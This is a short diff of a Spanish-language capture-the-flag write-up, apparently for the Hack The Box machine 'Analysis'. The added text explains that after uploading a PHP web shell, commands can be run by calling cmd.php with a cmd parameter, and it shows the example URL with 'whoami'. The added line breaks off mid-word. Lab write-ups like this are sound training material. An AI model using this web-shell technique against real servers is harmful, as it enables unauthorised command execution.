@@ -303,5 +303,6 @@ vamos a subir nuestro archivo para identificar si la pagina puede interpretarnos
 
 ![[Pasted image 20240724151934.png]]
 
-
 `http://internal.analysis.htb/dashboard/uploads/cmd.php?cmd=whoami`
+al subir el archivo solo debemos ir a la url y llamar al comando `cmd.php=` y podremos ejecutar c
+![[Pasted image 20240724152856.png]]
